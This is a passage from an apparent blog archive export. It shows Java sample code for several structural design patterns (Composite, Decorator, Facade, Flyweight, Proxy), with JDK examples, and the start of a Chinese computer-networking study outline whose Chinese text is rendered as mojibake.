tv) &#123; super(tv); &#125; @Override public void on() &#123; System.out.println("ConcreteRemoteControl1.on()"); tv.on(); &#125; @Override public void off() &#123; System.out.println("ConcreteRemoteControl1.off()"); tv.off(); &#125; @Override public void tuneChannel() &#123; System.out.println("ConcreteRemoteControl1.tuneChannel()"); tv.tuneChannel(); &#125;&#125; 1234567891011121314151617181920212223public class ConcreteRemoteControl2 extends RemoteControl &#123; public ConcreteRemoteControl2(TV tv) &#123; super(tv); &#125; @Override public void on() &#123; System.out.println("ConcreteRemoteControl2.on()"); tv.on(); &#125; @Override public void off() &#123; System.out.println("ConcreteRemoteControl2.off()"); tv.off(); &#125; @Override public void tuneChannel() &#123; System.out.println("ConcreteRemoteControl2.tuneChannel()"); tv.tuneChannel(); &#125;&#125; 12345678public class Client &#123; public static void main(String[] args) &#123; RemoteControl remoteControl1 = new ConcreteRemoteControl1(new RCA()); remoteControl1.on(); remoteControl1.off(); remoteControl1.tuneChannel(); &#125;&#125; JDK AWT (It provides an abstraction layer which maps onto the native OS the windowing support.) JDBC 3. ç»„åˆï¼ˆCompositeï¼‰æ„å›¾å°†å¯¹è±¡ç»„åˆæˆæ ‘å½¢ç»“æ„æ¥è¡¨ç¤ºâ€œæ•´ä½“/éƒ¨åˆ†â€å±‚æ¬¡å…³ç³»ï¼Œå…è®¸ç”¨æˆ·ä»¥ç›¸åŒçš„æ–¹å¼å¤„ç†å•ç‹¬å¯¹è±¡å’Œç»„åˆå¯¹è±¡ã€‚ ç±»å›¾ç»„ä»¶ï¼ˆComponentï¼‰ç±»æ˜¯ç»„åˆç±»ï¼ˆCompositeï¼‰å’Œå¶å­ç±»ï¼ˆLeafï¼‰çš„çˆ¶ç±»ï¼Œå¯ä»¥æŠŠç»„åˆç±»çœ‹æˆæ˜¯æ ‘çš„ä¸­é—´èŠ‚ç‚¹ã€‚ ç»„åˆå¯¹è±¡æ‹¥æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªç»„ä»¶å¯¹è±¡ï¼Œå› æ­¤ç»„åˆå¯¹è±¡çš„æ“ä½œå¯ä»¥å§”æ‰˜ç»™ç»„ä»¶å¯¹è±¡å»å¤„ç†ï¼Œè€Œç»„ä»¶å¯¹è±¡å¯ä»¥æ˜¯å¦ä¸€ä¸ªç»„åˆå¯¹è±¡æˆ–è€…å¶å­å¯¹è±¡ã€‚ å®ç°1234567891011121314151617public abstract class Component &#123; protected String name; public Component(String name) &#123; this.name = name; &#125; public void print() &#123; print(0); &#125; abstract void print(int level); abstract public void add(Component component); abstract public void remove(Component component);&#125; 123456789101112131415161718192021222324252627282930313233import java.util.ArrayList;import java.util.List;public class Composite extends Component &#123; private List&lt;Component&gt; child; public Composite(String name) &#123; super(name); child = new ArrayList&lt;&gt;(); &#125; @Override void print(int level) &#123; for (int i = 0; i &lt; level; i++) &#123; System.out.print("--"); &#125; System.out.println("Composite:" + name); for (Component component : child) &#123; component.print(level + 1); &#125; &#125; @Override public void add(Component component) &#123; child.add(component); &#125; @Override public void remove(Component component) &#123; child.remove(component); &#125;&#125; 1234567891011121314151617181920212223public class Leaf extends Component &#123; public Leaf(String name) &#123; super(name); &#125; @Override void print(int level) &#123; for (int i = 0; i &lt; level; i++) &#123; System.out.print("--"); &#125; System.out.println("left:" + name); &#125; @Override public void add(Component component) &#123; throw new UnsupportedOperationException(); // ç‰ºç‰²é€æ˜æ€§æ¢å–å•ä¸€èŒè´£åŸåˆ™ï¼Œè¿™æ ·å°±ä¸ç”¨è€ƒè™‘æ˜¯å¶å­èŠ‚ç‚¹è¿˜æ˜¯ç»„åˆèŠ‚ç‚¹ &#125; @Override public void remove(Component component) &#123; throw new UnsupportedOperationException(); &#125;&#125; 123456789101112131415161718public class Client &#123; public static void main(String[] args) &#123; Composite root = new Composite("root"); Component node1 = new Leaf("1"); Component node2 = new Composite("2"); Component node3 = new Leaf("3"); root.add(node1); root.add(node2); root.add(node3); Component node21 = new Leaf("21"); Component node22 = new Composite("22"); node2.add(node21); node2.add(node22); Component node221 = new Leaf("221"); node22.add(node221); root.print(); &#125;&#125; 1234567Composite:root--left:1--Composite:2----left:21----Composite:22------left:221--left:3 JDK javax.swing.JComponent#add(Component) java.awt.Container#add(Component) java.util.Map#putAll(Map) java.util.List#addAll(Collection) java.util.Set#addAll(Collection) 4. è£…é¥°ï¼ˆDecoratorï¼‰æ„å›¾ä¸ºå¯¹è±¡åŠ¨æ€æ·»åŠ åŠŸèƒ½ã€‚ ç±»å›¾è£…é¥°è€…ï¼ˆDecoratorï¼‰å’Œå…·ä½“ç»„ä»¶ï¼ˆConcreteComponentï¼‰éƒ½ç»§æ‰¿è‡ªç»„ä»¶ï¼ˆComponentï¼‰ï¼Œå…·ä½“ç»„ä»¶çš„æ–¹æ³•å®ç°ä¸éœ€è¦ä¾èµ–äºå…¶å®ƒå¯¹è±¡ï¼Œè€Œè£…é¥°è€…ç»„åˆäº†ä¸€ä¸ªç»„ä»¶ï¼Œè¿™æ ·å®ƒå¯ä»¥è£…é¥°å…¶å®ƒè£…é¥°è€…æˆ–è€…å…·ä½“ç»„ä»¶ã€‚æ‰€è°“è£…é¥°ï¼Œå°±æ˜¯æŠŠè¿™ä¸ªè£…é¥°è€…å¥—åœ¨è¢«è£…é¥°ä¸Šï¼Œä»è€ŒåŠ¨æ€æ‰©å±•è¢«è£…é¥°è€…çš„åŠŸèƒ½ã€‚è£…é¥°è€…çš„æ–¹æ³•æœ‰ä¸€éƒ¨åˆ†æ˜¯è‡ªå·±çš„ï¼Œè¿™å±äºå®ƒçš„åŠŸèƒ½ï¼Œç„¶åè°ƒç”¨è¢«è£…é¥°è€…çš„æ–¹æ³•å®ç°ï¼Œä»è€Œä¹Ÿä¿ç•™äº†è¢«è£…é¥°è€…çš„åŠŸèƒ½ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå…·ä½“ç»„ä»¶åº”å½“æ˜¯è£…é¥°å±‚æ¬¡çš„æœ€ä½å±‚ï¼Œå› ä¸ºåªæœ‰å…·ä½“ç»„ä»¶çš„æ–¹æ³•å®ç°ä¸éœ€è¦ä¾èµ–äºå…¶å®ƒå¯¹è±¡ã€‚ å®ç°è®¾è®¡ä¸åŒç§ç±»çš„é¥®æ–™ï¼Œé¥®æ–™å¯ä»¥æ·»åŠ é…æ–™ï¼Œæ¯”å¦‚å¯ä»¥æ·»åŠ ç‰›å¥¶ï¼Œå¹¶ä¸”æ”¯æŒåŠ¨æ€æ·»åŠ æ–°é…æ–™ã€‚æ¯å¢åŠ ä¸€ç§é…æ–™ï¼Œè¯¥é¥®æ–™çš„ä»·æ ¼å°±ä¼šå¢åŠ ï¼Œè¦æ±‚è®¡ç®—ä¸€ç§é¥®æ–™çš„ä»·æ ¼ã€‚ ä¸‹å›¾è¡¨ç¤ºåœ¨ DarkRoast é¥®æ–™ä¸Šæ–°å¢æ–°æ·»åŠ  Mocha é…æ–™ï¼Œä¹‹ååˆæ·»åŠ äº† Whip é…æ–™ã€‚DarkRoast è¢« Mocha åŒ…è£¹ï¼ŒMocha åˆè¢« Whip åŒ…è£¹ã€‚å®ƒä»¬éƒ½ç»§æ‰¿è‡ªç›¸åŒçˆ¶ç±»ï¼Œéƒ½æœ‰ cost() æ–¹æ³•ï¼Œå¤–å±‚ç±»çš„ cost() æ–¹æ³•è°ƒç”¨äº†å†…å±‚ç±»çš„ cost() æ–¹æ³•ã€‚ 123public interface Beverage &#123; double cost();&#125; 123456public class DarkRoast implements Beverage &#123; @Override public double cost() &#123; return 1; &#125;&#125; 123456public class HouseBlend implements Beverage &#123; @Override public double cost() &#123; return 1; &#125;&#125; 123public abstract class CondimentDecorator implements Beverage &#123; protected Beverage beverage;&#125; 1234567891011public class Milk extends CondimentDecorator &#123; public Milk(Beverage beverage) &#123; this.beverage = beverage; &#125; @Override public double cost() &#123; return 1 + beverage.cost(); &#125;&#125; 1234567891011public class Mocha extends CondimentDecorator &#123; public Mocha(Beverage beverage) &#123; this.beverage = beverage; &#125; @Override public double cost() &#123; return 1 + beverage.cost(); &#125;&#125; 12345678public class Client &#123; public static void main(String[] args) &#123; Beverage beverage = new HouseBlend(); beverage = new Mocha(beverage); beverage = new Milk(beverage); System.out.println(beverage.cost()); &#125;&#125; 13.0 è®¾è®¡åŸåˆ™ç±»åº”è¯¥å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ï¼šä¹Ÿå°±æ˜¯æ·»åŠ æ–°åŠŸèƒ½æ—¶ä¸éœ€è¦ä¿®æ”¹ä»£ç ã€‚é¥®æ–™å¯ä»¥åŠ¨æ€æ·»åŠ æ–°çš„é…æ–™ï¼Œè€Œä¸éœ€è¦å»ä¿®æ”¹é¥®æ–™çš„ä»£ç ã€‚ ä¸å¯èƒ½æŠŠæ‰€æœ‰çš„ç±»è®¾è®¡æˆéƒ½æ»¡è¶³è¿™ä¸€åŸåˆ™ï¼Œåº”å½“æŠŠè¯¥åŸåˆ™åº”ç”¨äºæœ€æœ‰å¯èƒ½å‘ç”Ÿæ”¹å˜çš„åœ°æ–¹ã€‚ JDK java.io.BufferedInputStream(InputStream) java.io.DataInputStream(InputStream) java.io.BufferedOutputStream(OutputStream) java.util.zip.ZipOutputStream(OutputStream) java.util.Collections#checkedList|Map|Set|SortedSet|SortedMap 5. å¤–è§‚ï¼ˆFacadeï¼‰æ„å›¾æä¾›äº†ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£ï¼Œç”¨æ¥è®¿é—®å­ç³»ç»Ÿä¸­çš„ä¸€ç¾¤æ¥å£ï¼Œä»è€Œè®©å­ç³»ç»Ÿæ›´å®¹æ˜“ä½¿ç”¨ã€‚ ç±»å›¾ å®ç°è§‚çœ‹ç”µå½±éœ€è¦æ“ä½œå¾ˆå¤šç”µå™¨ï¼Œä½¿ç”¨å¤–è§‚æ¨¡å¼å¯ä»¥å®ç°ä¸€é”®çœ‹ç”µå½±åŠŸèƒ½ã€‚ 12345678910111213public class SubSystem &#123; public void turnOnTV() &#123; System.out.println("turnOnTV()"); &#125; public void setCD(String cd) &#123; System.out.println("setCD( " + cd + " )"); &#125; public void starWatching()&#123; System.out.println("starWatching()"); &#125;&#125; 123456789public class Facade &#123; private SubSystem subSystem = new SubSystem(); public void watchMovie() &#123; subSystem.turnOnTV(); subSystem.setCD("a movie"); subSystem.starWatching(); &#125;&#125; 123456public class Client &#123; public static void main(String[] args) &#123; Facade facade = new Facade(); facade.watchMovie(); &#125;&#125; è®¾è®¡åŸåˆ™æœ€å°‘çŸ¥è¯†åŸåˆ™ï¼šåªå’Œä½ çš„å¯†å‹è°ˆè¯ã€‚ä¹Ÿå°±æ˜¯å®¢æˆ·å¯¹è±¡æ‰€éœ€è¦äº¤äº’çš„å¯¹è±¡åº”å½“å°½å¯èƒ½å°‘ã€‚ 6. äº«å…ƒï¼ˆFlyweightï¼‰æ„å›¾åˆ©ç”¨å…±äº«çš„æ–¹å¼æ¥æ”¯æŒå¤§é‡ç»†ç²’åº¦çš„å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡ä¸€éƒ¨åˆ†å†…éƒ¨çŠ¶æ€æ˜¯ç›¸åŒçš„ã€‚ ç±»å›¾ Flyweightï¼šäº«å…ƒå¯¹è±¡ IntrinsicStateï¼šå†…éƒ¨çŠ¶æ€ï¼Œç›¸åŒçš„é¡¹å…ƒå¯¹è±¡å…±äº« ExtrinsicStateï¼šå¤–éƒ¨çŠ¶æ€ å®ç°123public interface Flyweight &#123; void doOperation(String extrinsicState);&#125; 123456789101112131415public class ConcreteFlyweight implements Flyweight &#123; private String intrinsicState; public ConcreteFlyweight(String intrinsicState) &#123; this.intrinsicState = intrinsicState; &#125; @Override public void doOperation(String extrinsicState) &#123; System.out.println("Object address: " + System.identityHashCode(this)); System.out.println("IntrinsicState: " + intrinsicState); System.out.println("ExtrinsicState: " + extrinsicState); &#125;&#125; 1234567891011121314import java.util.HashMap;public class FlyweightFactory &#123; private HashMap&lt;String, Flyweight&gt; flyweights = new HashMap&lt;&gt;(); Flyweight getFlyweight(String intrinsicState) &#123; if (!flyweights.containsKey(intrinsicState)) &#123; Flyweight flyweight = new ConcreteFlyweight(intrinsicState); flyweights.put(intrinsicState, flyweight); &#125; return flyweights.get(intrinsicState); &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; FlyweightFactory factory = new FlyweightFactory(); Flyweight flyweight1 = factory.getFlyweight("aa"); Flyweight flyweight2 = factory.getFlyweight("aa"); flyweight1.doOperation("x"); flyweight2.doOperation("y"); &#125;&#125; 123456Object address: 1163157884IntrinsicState: aaExtrinsicState: xObject address: 1163157884IntrinsicState: aaExtrinsicState: y JDKJava åˆ©ç”¨ç¼“å­˜æ¥åŠ é€Ÿå¤§é‡å°å¯¹è±¡çš„è®¿é—®æ—¶é—´ã€‚ java.lang.Integer#valueOf(int) java.lang.Boolean#valueOf(boolean) java.lang.Byte#valueOf(byte) java.lang.Character#valueOf(char) 7. ä»£ç†ï¼ˆProxyï¼‰æ„å›¾æ§åˆ¶å¯¹å…¶å®ƒå¯¹è±¡çš„è®¿é—®ã€‚ ç±»å›¾ä»£ç†æœ‰ä»¥ä¸‹å››ç±»ï¼š è¿œç¨‹ä»£ç†ï¼ˆRemote Proxyï¼‰ï¼šæ§åˆ¶å¯¹è¿œç¨‹å¯¹è±¡ï¼ˆä¸åŒåœ°å€ç©ºé—´ï¼‰çš„è®¿é—®ï¼Œå®ƒè´Ÿè´£å°†è¯·æ±‚åŠå…¶å‚æ•°è¿›è¡Œç¼–ç ï¼Œå¹¶å‘ä¸åŒåœ°å€ç©ºé—´ä¸­çš„å¯¹è±¡å‘é€å·²ç»ç¼–ç çš„è¯·æ±‚ã€‚ è™šæ‹Ÿä»£ç†ï¼ˆVirtual Proxyï¼‰ï¼šæ ¹æ®éœ€è¦åˆ›å»ºå¼€é”€å¾ˆå¤§çš„å¯¹è±¡ï¼Œå®ƒå¯ä»¥ç¼“å­˜å®ä½“çš„é™„åŠ ä¿¡æ¯ï¼Œä»¥ä¾¿å»¶è¿Ÿå¯¹å®ƒçš„è®¿é—®ï¼Œä¾‹å¦‚åœ¨ç½‘ç«™åŠ è½½ä¸€ä¸ªå¾ˆå¤§å›¾ç‰‡æ—¶ï¼Œä¸èƒ½é©¬ä¸Šå®Œæˆï¼Œå¯ä»¥ç”¨è™šæ‹Ÿä»£ç†ç¼“å­˜å›¾ç‰‡çš„å¤§å°ä¿¡æ¯ï¼Œç„¶åç”Ÿæˆä¸€å¼ ä¸´æ—¶å›¾ç‰‡ä»£æ›¿åŸå§‹å›¾ç‰‡ã€‚ ä¿æŠ¤ä»£ç†ï¼ˆProtection Proxyï¼‰ï¼šæŒ‰æƒé™æ§åˆ¶å¯¹è±¡çš„è®¿é—®ï¼Œå®ƒè´Ÿè´£æ£€æŸ¥è°ƒç”¨è€…æ˜¯å¦å…·æœ‰å®ç°ä¸€ä¸ªè¯·æ±‚æ‰€å¿…é¡»çš„è®¿é—®æƒé™ã€‚ æ™ºèƒ½ä»£ç†ï¼ˆSmart Referenceï¼‰ï¼šå–ä»£äº†ç®€å•çš„æŒ‡é’ˆï¼Œå®ƒåœ¨è®¿é—®å¯¹è±¡æ—¶æ‰§è¡Œä¸€äº›é™„åŠ æ“ä½œï¼šè®°å½•å¯¹è±¡çš„å¼•ç”¨æ¬¡æ•°ï¼Œæ¯”å¦‚æ™ºèƒ½æ™ºèƒ½ï¼›å½“ç¬¬ä¸€æ¬¡å¼•ç”¨ä¸€ä¸ªæŒä¹…åŒ–å¯¹è±¡æ—¶ï¼Œå°†å®ƒè£…å…¥å†…å­˜ï¼›åœ¨è®¿é—®ä¸€ä¸ªå®é™…å¯¹è±¡å‰ï¼Œæ£€æŸ¥æ˜¯å¦å·²ç»é”å®šäº†å®ƒï¼Œä»¥ç¡®ä¿å…¶å®ƒå¯¹è±¡ä¸èƒ½æ”¹å˜å®ƒã€‚ å®ç°ä»¥ä¸‹æ˜¯ä¸€ä¸ªè™šæ‹Ÿä»£ç†çš„å®ç°ï¼Œæ¨¡æ‹Ÿäº†å›¾ç‰‡å»¶è¿ŸåŠ è½½çš„æƒ…å†µä¸‹ä½¿ç”¨ä¸å›¾ç‰‡å¤§å°ç›¸ç­‰çš„ä¸´æ—¶å†…å®¹å»æ›¿æ¢åŸå§‹å›¾ç‰‡ï¼Œç›´åˆ°å›¾ç‰‡åŠ è½½å®Œæˆæ‰å°†å›¾ç‰‡æ˜¾ç¤ºå‡ºæ¥ã€‚ 123public interface Image &#123; void showImage();&#125; 123456789101112131415161718192021222324252627282930313233public class HighResolutionImage implements Image &#123; private URL imageURL; private long startTime; private int height; private int width; public int getHeight() &#123; return height; &#125; public int getWidth() &#123; return width; &#125; public HighResolutionImage(URL imageURL) &#123; this.imageURL = imageURL; this.startTime = System.currentTimeMillis(); this.width = 600; this.height = 600; &#125; public boolean isLoad() &#123; // æ¨¡æ‹Ÿå›¾ç‰‡åŠ è½½ï¼Œå»¶è¿Ÿ 3s åŠ è½½å®Œæˆ long endTime = System.currentTimeMillis(); return endTime - startTime &gt; 3000; &#125; @Override public void showImage() &#123; System.out.println("Real Image: " + imageURL); &#125;&#125; 1234567891011121314151617181920public class ImageProxy implements Image &#123; private HighResolutionImage highResolutionImage; public ImageProxy(HighResolutionImage highResolutionImage) &#123; this.highResolutionImage = highResolutionImage; &#125; @Override public void showImage() &#123; while (!highResolutionImage.isLoad()) &#123; try &#123; System.out.println("Temp Image: " + highResolutionImage.getWidth() + " " + highResolutionImage.getHeight()); Thread.sleep(100); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; highResolutionImage.showImage(); &#125;&#125; 123456789public class ImageViewer &#123; public static void main(String[] args) throws Exception &#123; String image = "http://image.jpg"; URL url = new URL(image); HighResolutionImage highResolutionImage = new HighResolutionImage(url); ImageProxy imageProxy = new ImageProxy(highResolutionImage); imageProxy.showImage(); &#125;&#125; JDK java.lang.reflect.Proxy RMI å‚è€ƒèµ„æ–™ å¼—é‡Œæ›¼. Head First è®¾è®¡æ¨¡å¼ [M]. ä¸­å›½ç”µåŠ›å‡ºç‰ˆç¤¾, 2007. Gamma E. è®¾è®¡æ¨¡å¼: å¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2007. Bloch J. Effective java[M]. Addison-Wesley Professional, 2017. Design Patterns Design patterns implemented in Java The breakdown of design patterns in JDK]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è®¡ç®—æœºç½‘ç»œ]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%2F</url>
    <content type="text"><![CDATA[ä¸€ã€æ¦‚è¿° ç½‘ç»œçš„ç½‘ç»œ ISP ä¸»æœºä¹‹é—´çš„é€šä¿¡æ–¹å¼ ç”µè·¯äº¤æ¢ä¸åˆ†ç»„äº¤æ¢ æ—¶å»¶ è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„* äºŒã€ç‰©ç†å±‚ é€šä¿¡æ–¹å¼ å¸¦é€šè°ƒåˆ¶ ä¸‰ã€æ•°æ®é“¾è·¯å±‚ åŸºæœ¬é—®é¢˜ ä¿¡é“åˆ†ç±» ä¿¡é“å¤ç”¨æŠ€æœ¯ CSMA/CD åè®®* PPP åè®® MAC åœ°å€ å±€åŸŸç½‘ ä»¥å¤ªç½‘* äº¤æ¢æœº* è™šæ‹Ÿå±€åŸŸç½‘ å››ã€ç½‘ç»œå±‚* æ¦‚è¿° IP æ•°æ®æŠ¥æ ¼å¼ IP åœ°å€ç¼–å€æ–¹å¼ åœ°å€è§£æåè®® ARP ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®® ICMP è™šæ‹Ÿä¸“ç”¨ç½‘ VPN ç½‘ç»œåœ°å€è½¬æ¢ NAT è·¯ç”±å™¨çš„ç»“æ„ è·¯ç”±å™¨åˆ†ç»„è½¬å‘æµç¨‹ è·¯ç”±é€‰æ‹©åè®® äº”ã€è¿è¾“å±‚* UDP å’Œ TCP çš„ç‰¹ç‚¹ UDP é¦–éƒ¨æ ¼å¼ TCP é¦–éƒ¨æ ¼å¼ TCP çš„ä¸‰æ¬¡æ¡æ‰‹ TCP çš„å››æ¬¡æŒ¥æ‰‹ TCP æ»‘åŠ¨çª—å£ TCP å¯é ä¼ è¾“ TCP æµé‡æ§åˆ¶ TCP æ‹¥å¡æ§åˆ¶ å…­ã€åº”ç”¨å±‚ åŸŸåç³»ç»Ÿ æ–‡ä»¶ä¼ é€åè®® è¿œç¨‹ç™»å½•åè®® ç”µå­é‚®ä»¶åè®® åŠ¨æ€ä¸»æœºé…ç½®åè®® å¸¸ç”¨ç«¯å£ Web é¡µé¢è¯·æ±‚è¿‡ç¨‹ å‚è€ƒèµ„æ–™ ä¸€ã€æ¦‚è¿°ç½‘ç»œçš„ç½‘ç»œç½‘ç»œæŠŠä¸»æœºè¿æ¥èµ·æ¥ï¼Œè€Œäº’è”ç½‘æ˜¯æŠŠå¤šç§ä¸åŒçš„ç½‘ç»œè¿æ¥èµ·æ¥ï¼Œå› æ­¤äº’è”ç½‘æ˜¯ç½‘ç»œçš„ç½‘ç»œã€‚ ISPäº’è”ç½‘æœåŠ¡æä¾›å•† ISP å¯ä»¥ä»äº’è”ç½‘ç®¡ç†æœºæ„è·å¾—è®¸å¤š IP åœ°å€ï¼ŒåŒæ—¶æ‹¥æœ‰é€šä¿¡çº¿è·¯ä»¥åŠè·¯ç”±å™¨ç­‰è”ç½‘è®¾å¤‡ï¼Œä¸ªäººæˆ–æœºæ„å‘ ISP ç¼´çº³ä¸€å®šçš„è´¹ç”¨å°±å¯ä»¥æ¥å…¥äº’è”ç½‘ã€‚ ç›®å‰çš„äº’è”ç½‘æ˜¯ä¸€ç§å¤šå±‚æ¬¡ ISP ç»“æ„ï¼ŒISP æ ¹æ®è¦†ç›–é¢ç§¯çš„å¤§å°åˆ†ä¸ºç¬¬ä¸€å±‚ ISPã€åŒºåŸŸ ISP å’Œæ¥å…¥ ISPã€‚ äº’è”ç½‘äº¤æ¢ç‚¹ IXP å…è®¸ä¸¤ä¸ª ISP ç›´æ¥ç›¸è¿è€Œä¸ç”¨ç»è¿‡ç¬¬ä¸‰ä¸ª ISPã€‚ ä¸»æœºä¹‹é—´çš„é€šä¿¡æ–¹å¼ å®¢æˆ·-æœåŠ¡å™¨ï¼ˆC/Sï¼‰ï¼šå®¢æˆ·æ˜¯æœåŠ¡çš„è¯·æ±‚æ–¹ï¼ŒæœåŠ¡å™¨æ˜¯æœåŠ¡çš„æä¾›æ–¹ã€‚ å¯¹ç­‰ï¼ˆP2Pï¼‰ï¼šä¸åŒºåˆ†å®¢æˆ·å’ŒæœåŠ¡å™¨ã€‚ ç”µè·¯äº¤æ¢ä¸åˆ†ç»„äº¤æ¢1. ç”µè·¯äº¤æ¢ç”µè·¯äº¤æ¢ç”¨äºç”µè¯é€šä¿¡ç³»ç»Ÿï¼Œä¸¤ä¸ªç”¨æˆ·è¦é€šä¿¡ä¹‹å‰éœ€è¦å»ºç«‹ä¸€æ¡ä¸“ç”¨çš„ç‰©ç†é“¾è·¯ï¼Œå¹¶ä¸”åœ¨æ•´ä¸ªé€šä¿¡è¿‡ç¨‹ä¸­å§‹ç»ˆå ç”¨è¯¥é“¾è·¯ã€‚ç”±äºé€šä¿¡çš„è¿‡ç¨‹ä¸­ä¸å¯èƒ½ä¸€ç›´åœ¨ä½¿ç”¨ä¼ è¾“çº¿è·¯ï¼Œå› æ­¤ç”µè·¯äº¤æ¢å¯¹çº¿è·¯çš„åˆ©ç”¨ç‡å¾ˆä½ï¼Œå¾€å¾€ä¸åˆ° 10%ã€‚ 2. åˆ†ç»„äº¤æ¢æ¯ä¸ªåˆ†ç»„éƒ½æœ‰é¦–éƒ¨å’Œå°¾éƒ¨ï¼ŒåŒ…å«äº†æºåœ°å€å’Œç›®çš„åœ°å€ç­‰æ§åˆ¶ä¿¡æ¯ï¼Œåœ¨åŒä¸€ä¸ªä¼ è¾“çº¿è·¯ä¸ŠåŒæ—¶ä¼ è¾“å¤šä¸ªåˆ†ç»„äº’ç›¸ä¸ä¼šå½±å“ï¼Œå› æ­¤åœ¨åŒä¸€æ¡ä¼ è¾“çº¿è·¯ä¸Šå…è®¸åŒæ—¶ä¼ è¾“å¤šä¸ªåˆ†ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´åˆ†ç»„äº¤æ¢ä¸éœ€è¦å ç”¨ä¼ è¾“çº¿è·¯ã€‚ è€ƒè™‘åœ¨ä¸€ä¸ªé‚®å±€é€šä¿¡ç³»ç»Ÿä¸­ï¼Œé‚®å±€æ”¶åˆ°ä¸€ä»½é‚®ä»¶ä¹‹åï¼Œå…ˆå­˜å‚¨ä¸‹æ¥ï¼Œç„¶åæŠŠç›¸åŒç›®çš„åœ°çš„é‚®ä»¶ä¸€èµ·è½¬å‘åˆ°ä¸‹ä¸€ä¸ªç›®çš„åœ°ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯å­˜å‚¨è½¬å‘è¿‡ç¨‹ï¼Œåˆ†ç»„äº¤æ¢ä¹Ÿä½¿ç”¨äº†å­˜å‚¨è½¬å‘è¿‡ç¨‹ã€‚ æ—¶å»¶æ€»æ—¶å»¶ = ä¼ è¾“æ—¶å»¶ + ä¼ æ’­æ—¶å»¶ + å¤„ç†æ—¶å»¶ + æ’é˜Ÿæ—¶å»¶ 1. ä¼ è¾“æ—¶å»¶ä¸»æœºæˆ–è·¯ç”±å™¨ä¼ è¾“æ•°æ®å¸§æ‰€éœ€è¦çš„æ—¶é—´ã€‚ å…¶ä¸­ l è¡¨ç¤ºæ•°æ®å¸§çš„é•¿åº¦ï¼Œv è¡¨ç¤ºä¼ è¾“é€Ÿç‡ã€‚ 2. ä¼ æ’­æ—¶å»¶ç”µç£æ³¢åœ¨ä¿¡é“ä¸­ä¼ æ’­ä¸€å®šçš„è·ç¦»éœ€è¦èŠ±è´¹çš„æ—¶é—´ï¼Œç”µç£æ³¢ä¼ æ’­é€Ÿåº¦æ¥è¿‘å…‰é€Ÿã€‚ å…¶ä¸­ l è¡¨ç¤ºä¿¡é“é•¿åº¦ï¼Œv è¡¨ç¤ºç”µç£æ³¢åœ¨ä¿¡é“ä¸Šçš„ä¼ æ’­é€Ÿç‡ã€‚ 3. å¤„ç†æ—¶å»¶ä¸»æœºæˆ–è·¯ç”±å™¨æ”¶åˆ°åˆ†ç»„æ—¶è¿›è¡Œå¤„ç†æ‰€éœ€è¦çš„æ—¶é—´ï¼Œä¾‹å¦‚åˆ†æé¦–éƒ¨ã€ä»åˆ†ç»„ä¸­æå–æ•°æ®ã€è¿›è¡Œå·®é”™æ£€éªŒæˆ–æŸ¥æ‰¾é€‚å½“çš„è·¯ç”±ç­‰ã€‚ 4. æ’é˜Ÿæ—¶å»¶åˆ†ç»„åœ¨è·¯ç”±å™¨çš„è¾“å…¥é˜Ÿåˆ—å’Œè¾“å‡ºé˜Ÿåˆ—ä¸­æ’é˜Ÿç­‰å¾…çš„æ—¶é—´ï¼Œå–å†³äºç½‘ç»œå½“å‰çš„é€šä¿¡é‡ã€‚ è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„* 1. äº”å±‚åè®® åº”ç”¨å±‚ ï¼šä¸ºç‰¹å®šåº”ç”¨ç¨‹åºæä¾›æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œä¾‹å¦‚ HTTPã€DNS ç­‰ã€‚æ•°æ®å•ä½ä¸ºæŠ¥æ–‡ã€‚ è¿è¾“å±‚ ï¼šæä¾›çš„æ˜¯è¿›ç¨‹é—´çš„é€šç”¨æ•°æ®ä¼ è¾“æœåŠ¡ã€‚ç”±äºåº”ç”¨å±‚åè®®å¾ˆå¤šï¼Œå®šä¹‰é€šç”¨çš„è¿è¾“å±‚åè®®å°±å¯ä»¥æ”¯æŒä¸æ–­å¢å¤šçš„åº”ç”¨å±‚åè®®ã€‚è¿è¾“å±‚åŒ…æ‹¬ä¸¤ç§åè®®ï¼šä¼ è¾“æ§åˆ¶åè®® TCPï¼Œæä¾›é¢å‘è¿æ¥ã€å¯é çš„æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œæ•°æ®å•ä½ä¸ºæŠ¥æ–‡æ®µï¼›ç”¨æˆ·æ•°æ®æŠ¥åè®® UDPï¼Œæä¾›æ— è¿æ¥ã€å°½æœ€å¤§åŠªåŠ›çš„æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œæ•°æ®å•ä½ä¸ºç”¨æˆ·æ•°æ®æŠ¥ã€‚TCP ä¸»è¦æä¾›å®Œæ•´æ€§æœåŠ¡ï¼ŒUDP ä¸»è¦æä¾›åŠæ—¶æ€§æœåŠ¡ã€‚ ç½‘ç»œå±‚ ï¼šä¸ºä¸»æœºé—´æä¾›æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œè€Œè¿è¾“å±‚åè®®æ˜¯ä¸ºä¸»æœºä¸­çš„è¿›ç¨‹æä¾›æœåŠ¡ã€‚ç½‘ç»œå±‚æŠŠè¿è¾“å±‚ä¼ é€’ä¸‹æ¥çš„æŠ¥æ–‡æ®µæˆ–è€…ç”¨æˆ·æ•°æ®æŠ¥å°è£…æˆåˆ†ç»„ã€‚ æ•°æ®é“¾è·¯å±‚ 